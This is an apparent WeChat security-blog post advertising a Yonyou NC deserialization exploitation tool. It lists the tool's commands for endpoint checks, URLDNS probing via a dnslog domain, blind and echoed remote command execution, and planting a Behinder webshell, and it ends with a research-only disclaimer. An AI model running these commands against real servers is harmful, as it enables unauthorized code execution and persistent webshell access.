#  NC反序列化漏洞payload生成

Ghost2097221  [ Web安全工具库 ](javascript:void\(0\);)

**Web安全工具库** ![]()

微信号 websec-tools

功能介绍 将一些好用的红队工具、蓝队工具及自己的学习笔记分享给大家。。。

____

___发表于_

收录于合集

#反序列化 11 个

#序列化 7 个

> 项目作者：Ghost2097221
>
> 项目地址：https://github.com/Ghost2097221/YongyouNC-Unserialize-Tools

  

 **0x01 **前言****

无回显的构造链直接使用的是 CC6执行命令，回显的构造链使用了DefiningClassLoader来绕过默认的黑名单，然后结合
CC6构造链进行任意代码执行。搭配了接口检测功能和URLDNS构造链判断是否存在反序列化。

  

 **0x02 接口检查功能**

  * 

    
    
     java -jar nc6.5.jar http://127.0.0.1 Check

![](https://gitee.com/fuli009/images/raw/master/public/20220923141244.png)

  

 **0x03 URLDNS构造链探测**

  * 

    
    
     java -jar nc6.5.jar http://127.0.0.1 urldns http://123.dnslog.cn

![](https://gitee.com/fuli009/images/raw/master/public/20220923141245.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141246.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141248.png)

 **0x04 无回显命令执行**

  * 

    
    
     java -jar yonyouNCTools.jar http://192.168.222.130 blind calc.exe

![](https://gitee.com/fuli009/images/raw/master/public/20220923141249.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141250.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141252.png)

0x05 回显命令执行

  * 

    
    
    java -jar yonyouNCTools.jar http://192.168.222.130 Execute，通过 Header头传递命令。

![](https://gitee.com/fuli009/images/raw/master/public/20220923141254.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141255.png)

 **0x06 落地 webshell**

  * 

    
    
     java -jar yonyouNCTools.jar http://192.168.222.130 UploadShell "C:\Users\Administrator\Pictures\Camera Roll\1.jsp"

此处如果使用 java1.8运行，固定落地一个天蝎的 webshell，路径为：http://127.0.0.1/eozZEwBb.jsp，如果使用的是
java1.7运行，会重新动态编译，可以落地自定义的 webshell，路径随机。

![](https://gitee.com/fuli009/images/raw/master/public/20220923141258.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141300.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923141302.png)

 **0x07 下载地址**

1、通过项目地址下载

2、关注web安全工具库公众号，后台回复：20220910

  

 **0x04 声明**

仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者不承担任何法律及连带责任。

  

 **推 荐 阅 读**

  
  
  

加我微信：ivu123ivu，进送书活动群，不定时免费送书

  

《Python深度学习从零开始学》

![](https://gitee.com/fuli009/images/raw/master/public/20220923141304.png)

>
> 本书以通俗易懂的方式详细介绍深度学习的基础理论及其相关知识，同时提供图像识别、情感分析、迁移学习、人脸识别、图像风格迁移、生成对抗网络等案例引导读者入门深度学习。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

